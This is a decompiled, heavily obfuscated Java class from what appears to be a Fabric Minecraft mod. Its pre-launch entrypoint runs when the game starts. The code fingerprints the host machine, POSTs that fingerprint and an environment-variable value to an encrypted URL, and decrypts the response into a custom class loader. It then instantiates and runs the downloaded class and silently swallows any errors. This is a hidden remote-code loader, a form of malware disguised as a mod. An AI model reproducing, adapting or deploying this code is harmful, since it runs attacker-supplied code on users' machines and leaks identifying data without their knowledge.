/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.sun.jna.Platform
 *  net.fabricmc.loader.api.entrypoint.PreLaunchEntrypoint
 *  net.fabricmc.loader.impl.launch.FabricLauncherBase
 *  oshi.PlatformEnum
 */
import com.sun.jna.Platform;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.Optional;
import net.fabricmc.loader.api.entrypoint.PreLaunchEntrypoint;
import net.fabricmc.loader.impl.launch.FabricLauncherBase;
import oshi.PlatformEnum;

public class Init
implements PreLaunchEntrypoint {
    private static R D;
    private static Object Q;
    static e x;
    static c b;
    static i W;
    public static int y;
    private static final String[] a;
    private static final String[] c;
    private static final long[] d;
    private static final Integer[] e;

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onPreLaunch() {
        long l2;
        long l3 = l2 = 69844751179848L;
        long l4 = l3 ^ 0x4A298F9E548BL;
        long l5 = l3 ^ 0x4C67642CD338L;
        int n2 = e.R;
        try {
            Optional<String> optional;
            HttpResponse<byte[]> httpResponse;
            HttpResponse<byte[]> httpResponse2;
            block20: {
                int n3;
                block19: {
                    HttpRequest.Builder builder;
                    block18: {
                        String string;
                        String string2;
                        block17: {
                            Object[] objectArray = new Object[1];
                            objectArray[0] = l5;
                            String string3 = Init.G(objectArray);
                            if (string3.isBlank()) {
                                return;
                            }
                            builder = HttpRequest.newBuilder().uri(URI.create(Init.a(-6946710 + -((char)-6708), 0x69FF96 + (char)-25764, (int)l2))).POST(HttpRequest.BodyPublishers.ofString(string3)).header(Init.a(-6946710 + -((char)-6696), -6946710 + -((char)-6763), (int)l2), Init.a(-6946710 + -((char)-6697), -6946710 + -((char)-24054), (int)l2)).header(Init.a(-6946710 + -((char)-6707), 0x69FF96 + (char)-17026, (int)l2), Init.a(-6946710 + -((char)-6703), -6946710 + -((char)-8807), (int)l2));
                            string = string2 = System.getenv(Init.a(-6946710 + -((char)-6702), -6946710 + -((char)-12669), (int)l2));
                            if (n2 != 0) break block17;
                            if (string == null) break block18;
                            string = string2;
                        }
                        if (!string.isBlank()) {
                            builder.header(Init.a(-6946710 + -((char)-6694), 0x69FF96 + (char)-20341, (int)l2), string2);
                        }
                    }
                    HttpRequest httpRequest = builder.build();
                    httpResponse2 = HttpClient.newHttpClient().send(httpRequest, HttpResponse.BodyHandlers.ofByteArray());
                    n3 = httpResponse2.statusCode();
                    if (n2 != 0) break block19;
                    if (n3 != Init.a(10652, 0x75C829F00B9B30ECL ^ l2)) return;
                    httpResponse = httpResponse2;
                    if (n2 != 0) break block20;
                    n3 = httpResponse.body().length;
                }
                if (n3 == 0) {
                    return;
                }
                httpResponse = httpResponse2;
            }
            if ((optional = httpResponse.headers().firstValue(Init.a(-6946710 + -((char)-6705), 0x69FF96 + (char)-11560, (int)l2))).isEmpty()) {
                return;
            }
            byte[] byArray = Base64.getDecoder().decode(optional.get());
            byte[] byArray2 = httpResponse2.body();
            ClassLoader classLoader = FabricLauncherBase.getLauncher().getTargetClassLoader();
            D = new R(byArray2, l4, byArray, classLoader);
            Class<?> clazz = D.loadClass(Init.a(-6946710 + -((char)-6704), -6946710 + -((char)-20072), (int)l2));
            Q = clazz.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
            clazz.getMethod(Init.a(-6946710 + -((char)-6709), 0x69FF96 + (char)-26149, (int)l2), new Class[0]).invoke(Q, new Object[0]);
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Unable to fully structure code
     */
    static {
        block24: {
            block23: {
                block22: {
                    block21: {
                        var13 = new String[12];
                        var11_1 = 0;
                        var10_2 = "\u00e3:\u00a9>\u0005\u000bU\u0083\u009c&\u00ea0\u0010\u00f7\u0090I\u00fd\u0018\u00f9\u00d9\u009d\\\u00b7\u0012\u001al\u0013\u0087=Np\u00a9\u00ad+\u00a4\u00f4\u000eyg\u00e5\u00c5\u0087\n\u00ff\u0019J8\"\u00a2\u00ebs\u00f8\u008a\u0004\u00c6\u00c7jZ/\u0097\u008d|N\u0015\u0096Y\u00d5\u00f6\u009a\u00d0\u00fe\u00d5\u00adm\u008dY\u00db\u0082]\u00c8\u00e1\u00d7\u0087\u00de\u00c6\u007f(\t\u00a4\u00bfD{\u007fSv\u009e\u00b7\u00c4a(qs\u00e2:CC\u0006\u00c2'\u00cd\u00fb\u00d5\u00d9\u0007>p\u00e8\u00b6g\u0019\u00c9\nC\u0002u\u0088\u00e5\u0080\u00d3Z\u0086\u00f7\f\u00df\u0096!Q\u00f1\u00a5Jo\u0093\u0083\u00a9P";
                        var12_3 = "\u00e3:\u00a9>\u0005\u000bU\u0083\u009c&\u00ea0\u0010\u00f7\u0090I\u00fd\u0018\u00f9\u00d9\u009d\\\u00b7\u0012\u001al\u0013\u0087=Np\u00a9\u00ad+\u00a4\u00f4\u000eyg\u00e5\u00c5\u0087\n\u00ff\u0019J8\"\u00a2\u00ebs\u00f8\u008a\u0004\u00c6\u00c7jZ/\u0097\u008d|N\u0015\u0096Y\u00d5\u00f6\u009a\u00d0\u00fe\u00d5\u00adm\u008dY\u00db\u0082]\u00c8\u00e1\u00d7\u0087\u00de\u00c6\u007f(\t\u00a4\u00bfD{\u007fSv\u009e\u00b7\u00c4a(qs\u00e2:CC\u0006\u00c2'\u00cd\u00fb\u00d5\u00d9\u0007>p\u00e8\u00b6g\u0019\u00c9\nC\u0002u\u0088\u00e5\u0080\u00d3Z\u0086\u00f7\f\u00df\u0096!Q\u00f1\u00a5Jo\u0093\u0083\u00a9P".length();
                        var9_4 = 5;
                        var8_5 = -1;
lbl7:
                        // 2 sources

                        while (true) {
                            v0 = ++var8_5;
                            v1 = var10_2.substring(v0, v0 + var9_4);
                            v2 = -1;
                            break block21;
                            break;
                        }
lbl12:
                        // 1 sources

                        while (true) {
                            var13[var11_1++] = v3.intern();
                            if ((var8_5 += var9_4) < var12_3) {
                                var9_4 = var10_2.charAt(var8_5);
                                ** continue;
                            }
                            var10_2 = "\u0004\u00d7g\u00e3\u00a4\u00da\u001f\n\u001f\u00d2vE\u00a1\t\u00cd\" \u0080";
                            var12_3 = "\u0004\u00d7g\u00e3\u00a4\u00da\u001f\n\u001f\u00d2vE\u00a1\t\u00cd\" \u0080".length();
                            var9_4 = 7;
                            var8_5 = -1;
lbl21:
                            // 2 sources

                            while (true) {
                                v4 = ++var8_5;
                                v1 = var10_2.substring(v4, v4 + var9_4);
                                v2 = 0;
                                break block21;
                                break;
                            }
                            break;
                        }
lbl26:
                        // 1 sources

                        while (true) {
                            var13[var11_1++] = v3.intern();
                            if ((var8_5 += var9_4) < var12_3) {
                                var9_4 = var10_2.charAt(var8_5);
                                ** continue;
                            }
                            break block22;
                            break;
                        }
                    }
                    v5 = v1.toCharArray();
                    var14_6 = 0;
                    v6 = v5.length;
                    v7 = v5;
                    v8 = v6;
                    if (v6 > 1) ** GOTO lbl76
                    do {
                        v9 = v7;
                        v10 = v7;
                        v11 = var14_6;
                        while (true) {
                            v12 = v9[v11];
                            switch (var14_6 % 7) {
                                case 0: {
                                    v13 = 127;
                                    break;
                                }
                                case 1: {
                                    v13 = 57;
                                    break;
                                }
                                case 2: {
                                    v13 = 112;
                                    break;
                                }
                                case 3: {
                                    v13 = 82;
                                    break;
                                }
                                case 4: {
                                    v13 = 29;
                                    break;
                                }
                                case 5: {
                                    v13 = 81;
                                    break;
                                }
                                default: {
                                    v13 = 106;
                                }
                            }
                            v9[v11] = (char)(v12 ^ v13);
                            ++var14_6;
                            v7 = v10;
                            v8 = v8;
                            if (v8 != 0) break;
                            v10 = v7;
                            v14 = v8;
                            v11 = v8;
                            v9 = v7;
                        }
lbl76:
                        // 2 sources

                        v15 = v7;
                        v14 = v8;
                    } while (v8 > var14_6);
                    v3 = new String(v15);
                    switch (v2) {
                        default: {
                            ** continue;
                        }
                        ** case 0:
lbl85:
                        // 1 sources

                        ** continue;
                    }
                }
                Init.a = var13;
                Init.c = new String[12];
                var0_7 = 113960797693347L;
                var6_8 = new long[3];
                var3_9 = 0;
                var4_10 = "\u0017\u008a)\u0014\u00aa\u0018\u00bcv\u00fc\u00ea\u001d.d\u00d35\u00cf\u00ee:\u0094v\u00b0\u0016\u00c4\u00b9";
                var5_11 = "\u0017\u008a)\u0014\u00aa\u0018\u00bcv\u00fc\u00ea\u001d.d\u00d35\u00cf\u00ee:\u0094v\u00b0\u0016\u00c4\u00b9".length();
                var2_12 = 0;
                while (true) {
                    break block23;
                    break;
                }
lbl97:
                // 1 sources

                while (true) {
                    var6_8[v16] = (((long)var7_13[0] & 255L) << 56 | ((long)var7_13[1] & 255L) << 48 | ((long)var7_13[2] & 255L) << 40 | ((long)var7_13[3] & 255L) << 32 | ((long)var7_13[4] & 255L) << 24 | ((long)var7_13[5] & 255L) << 16 | ((long)var7_13[6] & 255L) << 8 | (long)var7_13[7] & 255L) ^ var0_7;
                    if (var2_12 < var5_11) ** continue;
                    break block24;
                    break;
                }
            }
            var7_13 = var4_10.substring(var2_12, var2_12 += 8).getBytes("ISO-8859-1");
            v16 = var3_9++;
            ** while (true)
        }
        Init.d = var6_8;
        Init.e = new Integer[3];
        Init.x = new e();
        Init.b = new c();
        Init.W = new i();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String i(Object[] objectArray) {
        int n2;
        String string;
        int n3;
        long l2;
        block10: {
            block11: {
                l2 = (Long)objectArray[0];
                byte[] byArray = (byte[])objectArray[1];
                StringBuilder stringBuilder = new StringBuilder(2 * byArray.length);
                byte[] byArray2 = byArray;
                int n4 = byArray2.length;
                n3 = e.R;
                int n5 = 0;
                while (n5 < n4) {
                    byte by2 = byArray2[n5];
                    String string2 = Integer.toHexString(Init.a(8211, 0x78466473C11B8456L ^ l2) & by2);
                    int n6 = n3;
                    if (l2 >= 0L) {
                        if (n6 == 0) {
                            string = string2;
                            n2 = n3;
                            if (l2 < 0L) break block10;
                            if (n2 != 0) break block11;
                            if (string.length() == 1) {
                                stringBuilder.append((char)Init.a(22545, 0x73403A14DB15FC56L ^ l2));
                            }
                            stringBuilder.append(string2);
                            ++n5;
                        }
                        n6 = n3;
                    }
                    if (n6 == 0) continue;
                }
                string = stringBuilder.toString();
            }
            n2 = y;
        }
        if (l2 >= 0L) {
            if (n2 == 0) return string;
            n2 = ++n3;
        }
        e.R = n2;
        return string;
    }

    private static String a(int n2, int n3, int n4) {
        int n5 = (n2 ^ n4 ^ 0x7AD3) & 0xFFFF;
        if (c[n5] == null) {
            int n6;
            char[] cArray = a[n5].toCharArray();
            int n7 = switch (cArray[0] & 0xFF) {
                case 0 -> 179;
                case 1 -> 234;
                case 2 -> 70;
                case 3 -> 124;
                case 4 -> 49;
                case 5 -> 222;
                case 6 -> 226;
                case 7 -> 126;
                case 8 -> 151;
                case 9 -> 122;
                case 10 -> 27;
                case 11 -> 172;
                case 12 -> 111;
                case 13 -> 99;
                case 14 -> 232;
                case 15 -> 192;
                case 16 -> 24;
                case 17 -> 142;
                case 18 -> 140;
                case 19 -> 218;
                case 20 -> 135;
                case 21 -> 86;
                case 22 -> 13;
                case 23 -> 199;
                case 24 -> 6;
                case 25 -> 73;
                case 26 -> 236;
                case 27 -> 117;
                case 28 -> 87;
                case 29 -> 245;
                case 30 -> 98;
                case 31 -> 215;
                case 32 -> 184;
                case 33 -> 190;
                case 34 -> 240;
                case 35 -> 148;
                case 36 -> 1;
                case 37 -> 129;
                case 38 -> 177;
                case 39 -> 42;
                case 40 -> 107;
                case 41 -> 250;
                case 42 -> 83;
                case 43 -> 170;
                case 44 -> 131;
                case 45 -> 165;
                case 46 -> 8;
                case 47 -> 5;
                case 48 -> 17;
                case 49 -> 153;
                case 50 -> 20;
                case 51 -> 108;
                case 52 -> 223;
                case 53 -> 144;
                case 54 -> 180;
                case 55 -> 64;
                case 56 -> 101;
                case 57 -> 203;
                case 58 -> 154;
                case 59 -> 80;
                case 60 -> 224;
                case 61 -> 39;
                case 62 -> 79;
                case 63 -> 229;
                case 64 -> 136;
                case 65 -> 233;
                case 66 -> 115;
                case 67 -> 134;
                case 68 -> 66;
                case 69 -> 118;
                case 70 -> 97;
                case 71 -> 89;
                case 72 -> 31;
                case 73 -> 220;
                case 74 -> 175;
                case 75 -> 30;
                case 76 -> 65;
                case 77 -> 244;
                case 78 -> 139;
                case 79 -> 9;
                case 80 -> 88;
                case 81 -> 45;
                case 82 -> 133;
                case 83 -> 36;
                case 84 -> 237;
                case 85 -> 52;
                case 86 -> 197;
                case 87 -> 241;
                case 88 -> 227;
                case 89 -> 168;
                case 90 -> 249;
                case 91 -> 22;
                case 92 -> 112;
                case 93 -> 248;
                case 94 -> 37;
                case 95 -> 93;
                case 96 -> 72;
                case 97 -> 51;
                case 98 -> 43;
                case 99 -> 14;
                case 100 -> 60;
                case 101 -> 171;
                case 102 -> 228;
                case 103 -> 185;
                case 104 -> 202;
                case 105 -> 231;
                case 106 -> 53;
                case 107 -> 116;
                case 108 -> 103;
                case 109 -> 82;
                case 110 -> 196;
                case 111 -> 173;
                case 112 -> 208;
                case 113 -> 235;
                case 114 -> 230;
                case 115 -> 34;
                case 116 -> 95;
                case 117 -> 162;
                case 118 -> 207;
                case 119 -> 219;
                case 120 -> 56;
                case 121 -> 19;
                case 122 -> 183;
                case 123 -> 102;
                case 124 -> 41;
                case 125 -> 114;
                case 126 -> 145;
                case 127 -> 62;
                case 128 -> 238;
                case 129 -> 150;
                case 130 -> 163;
                case 131 -> 35;
                case 132 -> 166;
                case 133 -> 187;
                case 134 -> 178;
                case 135 -> 169;
                case 136 -> 252;
                case 137 -> 210;
                case 138 -> 76;
                case 139 -> 164;
                case 140 -> 57;
                case 141 -> 156;
                case 142 -> 110;
                case 143 -> 123;
                case 144 -> 47;
                case 145 -> 7;
                case 146 -> 12;
                case 147 -> 113;
                case 148 -> 189;
                case 149 -> 127;
                case 150 -> 206;
                case 151 -> 109;
                case 152 -> 147;
                case 153 -> 128;
                case 154 -> 50;
                case 155 -> 32;
                case 156 -> 71;
                case 157 -> 3;
                case 158 -> 90;
                case 159 -> 10;
                case 160 -> 186;
                case 161 -> 155;
                case 162 -> 191;
                case 163 -> 91;
                case 164 -> 146;
                case 165 -> 106;
                case 166 -> 216;
                case 167 -> 174;
                case 168 -> 239;
                case 169 -> 18;
                case 170 -> 158;
                case 171 -> 119;
                case 172 -> 193;
                case 173 -> 94;
                case 174 -> 28;
                case 175 -> 81;
                case 176 -> 212;
                case 177 -> 67;
                case 178 -> 4;
                case 179 -> 141;
                case 180 -> 253;
                case 181 -> 214;
                case 182 -> 15;
                case 183 -> 161;
                case 184 -> 78;
                case 185 -> 105;
                case 186 -> 138;
                case 187 -> 74;
                case 188 -> 33;
                case 189 -> 96;
                case 190 -> 59;
                case 191 -> 132;
                case 192 -> 69;
                case 193 -> 137;
                case 194 -> 92;
                case 195 -> 55;
                case 196 -> 217;
                case 197 -> 209;
                case 198 -> 25;
                case 199 -> 120;
                case 200 -> 85;
                case 201 -> 121;
                case 202 -> 100;
                case 203 -> 198;
                case 204 -> 77;
                case 205 -> 149;
                case 206 -> 75;
                case 207 -> 181;
                case 208 -> 242;
                case 209 -> 0;
                case 210 -> 195;
                case 211 -> 21;
                case 212 -> 246;
                case 213 -> 157;
                case 214 -> 61;
                case 215 -> 221;
                case 216 -> 40;
                case 217 -> 29;
                case 218 -> 204;
                case 219 -> 182;
                case 220 -> 84;
                case 221 -> 160;
                case 222 -> 63;
                case 223 -> 44;
                case 224 -> 200;
                case 225 -> 254;
                case 226 -> 188;
                case 227 -> 247;
                case 228 -> 176;
                case 229 -> 143;
                case 230 -> 211;
                case 231 -> 125;
                case 232 -> 58;
                case 233 -> 2;
                case 234 -> 255;
                case 235 -> 152;
                case 236 -> 201;
                case 237 -> 194;
                case 238 -> 38;
                case 239 -> 48;
                case 240 -> 213;
                case 241 -> 130;
                case 242 -> 251;
                case 243 -> 104;
                case 244 -> 243;
                case 245 -> 26;
                case 246 -> 46;
                case 247 -> 11;
                case 248 -> 159;
                case 249 -> 68;
                case 250 -> 167;
                case 251 -> 225;
                case 252 -> 205;
                case 253 -> 54;
                case 254 -> 23;
                default -> 16;
            };
            int n8 = ((n3 ^= n4) & 0xFF) - n7;
            if (n8 < 0) {
                n8 += 256;
            }
            if ((n6 = ((n3 & 0xFFFF) >>> 8) - n7) < 0) {
                n6 += 256;
            }
            int n9 = 0;
            while (n9 < cArray.length) {
                int n10 = n9 % 2;
                int n11 = n9;
                char[] cArray2 = cArray;
                char c2 = cArray[n11];
                if (n10 == 0) {
                    cArray2[n11] = (char)(c2 ^ n8);
                    n8 = ((n8 >>> 3 | n8 << 5) ^ cArray[n9]) & 0xFF;
                } else {
                    cArray2[n11] = (char)(c2 ^ n6);
                    n6 = ((n6 >>> 3 | n6 << 5) ^ cArray[n9]) & 0xFF;
                }
                ++n9;
            }
            Init.c[n5] = new String(cArray).intern();
        }
        return c[n5];
    }

    private static int a(int n2, long l2) {
        int n3 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x7939;
        if (e[n3] == null) {
            Init.e[n3] = (int)(d[n3] ^ l2);
        }
        return e[n3];
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String G(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        long l3 = l2;
        long l4 = l3 ^ 0x62416E1E40DL;
        long l5 = l3 ^ 0x437EA897BD85L;
        long l6 = l3 ^ 0x26346067EE0CL;
        long l7 = l3 ^ 0x5D0F367A598CL;
        try {
            PlatformEnum platformEnum = PlatformEnum.getValue((int)Platform.getOSType());
            MessageDigest messageDigest = MessageDigest.getInstance(Init.a(-1682283450 + -((char)-25955), -1682283450 + -((char)-23480), (int)l2));
            byte[] byArray = switch (p.K[platformEnum.ordinal()]) {
                case 1 -> {
                    Object[] v1 = new Object[2];
                    v1[1] = l4;
                    v1[0] = true;
                    yield x.O(v1).getBytes(StandardCharsets.UTF_8);
                }
                case 2 -> {
                    Object[] v3 = new Object[2];
                    v3[1] = true;
                    v3[0] = l7;
                    yield W.j(v3).getBytes(StandardCharsets.UTF_8);
                }
                case 3 -> {
                    Object[] v4 = new Object[2];
                    v4[1] = l5;
                    v4[0] = true;
                    yield b.T(v4).getBytes(StandardCharsets.UTF_8);
                }
                default -> throw new IllegalArgumentException();
            };
            Object[] objectArray2 = new Object[2];
            objectArray2[1] = messageDigest.digest(byArray);
            objectArray2[0] = l6;
            return Init.i(objectArray2);
        }
        catch (Exception exception) {
            return Init.a(-1682283450 + -((char)-25950), -1682283450 + -((char)-16167), (int)l2);
        }
    }
}

